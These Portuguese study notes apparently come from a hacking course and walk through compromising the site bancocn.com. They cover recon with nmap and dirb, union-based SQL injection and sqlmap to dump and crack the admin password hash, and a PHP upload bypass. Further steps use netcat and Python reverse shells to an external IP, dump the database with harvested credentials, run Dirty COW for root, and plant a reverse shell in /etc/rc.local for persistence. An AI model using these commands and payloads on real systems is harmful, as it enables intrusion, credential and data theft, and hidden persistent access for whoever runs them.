COLETA DE INFORMACOES

utilizando o - whois endereço
	     - host endereço
	     - dnsenum endereço

podemos coletar informações do tipo

Name Server: MEGAN.NS.CLOUDFLARE.COM
Name Server: NOEL.NS.CLOUDFLARE.COM
#Name Servers? Servidor de hospedagem, cloudfare protege o verdadeiro
ip do servidor. Intermedia a comunicacao com o servidor.
WEB APPLICATION FIREWALL (protege aplicacoes web)

www.bancocn.com 104.24.122.12 (ip protegido)
--------------------------------------------------------------
ENUMERACAO DE SERVICOS - Dentro do servidor existem varios servicos rodando
em diferentes portas, ex 80, 23, 443. Quanto mais servicos encontrados maior 
a chance de se encontrar falhas.

NMAP - nmap -sS -sV bancocn.com 
comando basico de scan no nmap, pega portas utilizadas no site
O aparecimento de certas portas depende do firewall q protege o site,
geralmente o servidor possui mais portas, porem o firewall restringe as portas
q sao expostas(nesse caso aparecem apenas http https)

RESULT
PORT     STATE SERVICE VERSION
80/tcp   open  http    Cloudflare http proxy
443/tcp  open  ssl
8080/tcp open  http    Cloudflare http proxy
8443/tcp open  ssl
------------------------------------------------------------------
ENCONTRANDO VULNERABILIDADES WEB

explorando o código fonte:
-descobrimos a pasta assets: Apache/2.4.29 (Ubuntu) Server at www.bancocn.com Port 80 - servidor web

intitle: "index of" - google hacking (sites com diretório aberto)

Explorando as ferramentas de desenvolvedor do Firefox podemos analisar as requisições do site
utilizando o netcat(nc no terminal) podemos testar uma requisição

nc bancocn.com 80
GET / HTTP/1.0
INFORMAÇÕES DE REQUESTS

Utilizando o Dirb podemos fazer um brute force em pastas do site

dirb bancocn.com -v (enumera detalhando pastas padrão testadas)
dirb bancocn.com -v -a "user-agent" c "cookies" (para passar pela verificação do cloudfare)

RESULTS DIRB:

==> DIRECTORY: http://www.bancocn.com/admin/                                                                                                                         
==> DIRECTORY: http://www.bancocn.com/assets/                                                                                                                        
==> DIRECTORY: http://www.bancocn.com/classes/                                                                                                                       
==> DIRECTORY: http://www.bancocn.com/css/                                                                                                                           
==> DIRECTORY: http://www.bancocn.com/images/                                                                                                                        
+ http://www.bancocn.com/index.php (CODE:200|SIZE:12532)                                                                                                             
+ http://www.bancocn.com/robots.txt (CODE:200|SIZE:31)                                                                                                               
+ http://www.bancocn.com/server-status (CODE:403|SIZE:280)                                                                                                           
+ http://www.bancocn.com/sox (CODE:521|SIZE:170)                                                                                                                     
+ http://www.bancocn.com/sp (CODE:521|SIZE:170)                                                                                                                      
+ http://www.bancocn.com/space (CODE:521|SIZE:170)                                                                                                                   
+ http://www.bancocn.com/spacer (CODE:521|SIZE:170)                                                                                                                  
+ http://www.bancocn.com/spain (CODE:521|SIZE:170)                                                                                                                   
+ http://www.bancocn.com/spam (CODE:521|SIZE:170)                                                                                                                    
+ http://www.bancocn.com/spamlog.log (CODE:521|SIZE:170)                                                                                                             
+ http://www.bancocn.com/spanish (CODE:521|SIZE:170)                                                                                                                 
+ http://www.bancocn.com/spaw (CODE:521|SIZE:170)                                                                                                                    
+ http://www.bancocn.com/speakers (CODE:521|SIZE:170)                                                                                                                
+ http://www.bancocn.com/spec (CODE:521|SIZE:170)                                                                                                                    
+ http://www.bancocn.com/special (CODE:521|SIZE:170)                                                                                                                 
+ http://www.bancocn.com/special_offers (CODE:521|SIZE:170)                                                                                                          
+ http://www.bancocn.com/specials (CODE:521|SIZE:170)                                                                                                                
+ http://www.bancocn.com/specified (CODE:521|SIZE:170)                                                                                                               
+ http://www.bancocn.com/specs (CODE:521|SIZE:170)                                                                                                                   
+ http://www.bancocn.com/speedtest (CODE:521|SIZE:170)                                                                                                               
+ http://www.bancocn.com/spellchecker (CODE:521|SIZE:170)                                                                                                            
+ http://www.bancocn.com/sphider (CODE:521|SIZE:170)                                                                                                                 
+ http://www.bancocn.com/spider (CODE:521|SIZE:170)                                                                                                                  
+ http://www.bancocn.com/spiders (CODE:521|SIZE:170)           

      
------------------------------------------------------------------------------------
SQL INJECTION

Descobrimos o servidor que roda o banco de dados do site
MariaDB http://www.bancocn.com/cat.php?id=

1- Descobrir o número de colunas na tabela de dados
URL id=1 order by 4 (resulta erro, descobrimos q existem apenas 3 colunas)

2 - Descobrir por qual caminho se pode ver as informações na tela
URL id=-1 union select x, y, z (o -1 ignora as primeiras informações e mostra o conteudo de x, y, ou z)

3- Pelo caminho descoberto

a. descobrir o nome do banco
group_concat(schema_name) from information_schema.schemata (retorna nome dos bancos visiveis)
nomes dos bancos: bancocn, information_schema(banco padrão do MySQL)

b. descobrir o nome das tabelas
group_concat(table_name) from information_schema.tables where table_schema="bancocn"
(retorna o nome das tabelas onde o nome do banco é bancocn) schema=banco
nome das tabelas: categories,pictures,stats,users

c. descobrir o nome das colunas
group_concat(column_name) from information_schema.columns where table_schema="bancocn" and table_name="users"
(retorna o nome das colunas da tabela passada no banco passado)
nome das colunas em users: id,login,password

4- Obter acesso

group_concat(id,":",login,":",password) from bancocn.users
resultado: 1:admin:7b71be0e85318117d2e514ce2a2e222c

a senha está criptografada com padrão MD5 - o site MD5 Killer pode quebrar a senha caso seja fraca
senha descriptografada = senhafoda

Atacando usando SQLmap

1- criamos um header válido q seja aceito e não barrado pelo firewall

2- descobrindo os bancos
sqlmap -r header_sqlmap.txt --dbs --dbms=mysql

3- descobrindo as tabelas
sqlmap -r header_sqlmap.txt --dbms=mysql -D bancocn --tables                                                                                                130 ⨯

4- descobrindo as colunas
sqlmap -r header_sqlmap.txt --dbms=mysql -D bancocn -T users --columns

5- descobrindo informação
sqlmap -r header_sqlmap.txt --dbms=mysql -D bancocn -T users -C login,password --dump   
--------------------------------------------------------------------------------------------
CRIANDO UMA SHELL REVERSA

Podemos inserir um arquivo malicioso em php pra rodar dentro do servidor
Caso o servidor não aceite arquivos php é possivel fazer um bypass do tipo
renomeando o arquivo x.php > x.php5 ou talvez x.php > x.jpg.php (depende da proteção)

Podemos criar uma shell reversa usando o netcat

nc -lvp 666 (abre a porta)
nc -e /bin/bash 127.0.0.1 666 (executa o bash porém mostra na outra máquina de acesso)

1- Abre as portas do roteador e configura o DMZ do modem
route -n (gateway mostra o ip do roteador)
ifconfig (apresenta ip local)

o site YouCanSeeMe permite testar se a porta está aberta

com a porta 666 aberta podemos executar no url de acesso ao arquivo cmp.php
nc -e /bin/bash ipext 666 para executar o bash e rodar a shell

porém geralmente o linux de servidores não possuem o parâmetro -e por segurança

podemos usar uma shell reversa em python procurando reverse shell cheat sheet

descobrimos o ip real do servidor: 3.223.167.112

utilizando um código python na shell podemos abrir uma shell tty que é muito útil para
realizar certos processos

python -c "import pty; pty.spawn('/bin/bash')"
-----------------------------------------------------------------------------------------------
POST EXPLOTATION (PÓS EXPLORAÇÃO)

Operações realizadas após estar dentro do servidor

whoami (podemos ver que tipo de usuário somos dentro do servidor)

ls -la (podemos ver que tipo de usuário tem acesso a cada arquivo)

explorando as pastas entramos na pasta classes que possui o arquivo db.php que contém o link
com o banco de dados. Usuario: bancocn Senha: bancocn123

mysql -u bancocn -p (acesso ao banco de dados com usuário e senha -> bancocn123)

show databases; (mostra os bancos) 
use bancocn; (escolhe o banco a ser usado)
show tables; (mostra as tabelas)
select * from users; (seleciona e mostra tudo da tabela users)

utilizando a ferramenta mysqldump podemos copiar toda informação de um banco para um arquivo

mysqldump -u bancocn -p bancocn --single-transaction > dump.sql
o arquivo dump.sql será gerado no diretório atual
--------------------------------------------------------------------------------------------
CRIPTOGRAFIA

Usando o programa md5sum podemos criar uma hash de senha MD5
ex. md5sum arquivo.txt

usando echo -n palavra arquivo.txt criamos um arquivo com a palavra dentro
usando echo -n palavra arquivo.txt | md5sum emendamos 2 comandos e a saida do primeiro vai
direto pro segundo, já criando a hash

usando o programa hash-identifier podemos identificar qual o tipo de uma hash
---------------------------------------------------------------------------------------------
PRIVILEGE ESCALATION

Verificando a versão do linux do servidor, é possivel identificar se ele está atualizado
caso não esteja, existem programas que podem explorar falhas do sistema para conseguir permissão
root. (o comando uname -a nos mostra a versão do linux)

dirtcow é uma vulnerabilidade do sistema linux inclusive android

podemos baixar um programa em c do github que realiza o dirtcow

github -> programa -> raw -> copia o link -> no terminal: wget link

compilamos e criamos o arquivo executável do programa (obs: verificar no código se x64 ou x86(32bits))

podemos utilizar o netcat para enviar o arquivo ao servidor 

nc -lvp 666 < arquivo (na máquina de origem)
nc ipext 666 > arquivo (no servidor de destino para receber)

podemos usar o comando chmod +x arquivo para dar permissão de execução a esse arquivo

Ao executar o cowroot o servidor irá cair.
Para driblar isso podemos implementar um script q nos conecta a uma shell reversa após reinicio

o arquivo /etc/rc.local pode ser usado para executar comandos na abertura do sistema
podemos copiar ele para a pasta q estamos com cp /etc/rc.local .

abrimos com o nano e antes do exit 0 inserimos o codigo da shell python + um espaço + &
isso garante que a shell fique rodando em segundo plano

Criamos um script agora .sh que recebe comandos linux, para mover essa cópia para a pasta /etc/

mv rc.local /etc/rc.local (substitui arquivo)
chmod 755 /etc/rc.local
chown root:root /etc/rc.local (permissões)

com o netcat aberto na porta que deseja receber a shell
executamos o cowroot -> executamos o script.sh -> reboot

o servidor irá reiniciar e qnd voltar teremos acesso root pela shell 









